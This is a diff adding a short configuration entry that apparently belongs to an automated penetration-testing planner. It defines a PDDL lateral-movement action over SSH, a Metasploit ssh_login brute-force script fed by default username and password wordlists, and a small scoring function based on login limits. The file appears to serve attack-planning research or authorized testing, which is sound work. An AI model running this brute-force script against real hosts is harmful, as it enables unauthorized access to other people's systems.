@@ -1,0 +1,32 @@
+[pddl]
+    (:action auxiliary/scanner/ssh/ssh_login
+        :parameters (?from ?to)
+        :precondition (and
+            (located ?from)
+            (connected ?from ?to)
+            (exploited ?from)
+            (port-22 ?to)
+        )
+        :effect (and
+            (not (located ?from))
+            (located ?to)
+            (exploited ?to)
+        )
+    )
+[script]
+|> msf
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS {RHOSTS}
+set USER_FILE  /usr/share/metasploit-framework/data/wordlists/http_default_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
+exploit
+
+[evc]
+def evc(login_limits):
+    if login_limits == "Unlimited":
+        return 0.01
+    else:
+        return 1-(1-95**-8)**int(login_limits)
+
+[evd]
+LOG: Q=5, A=3
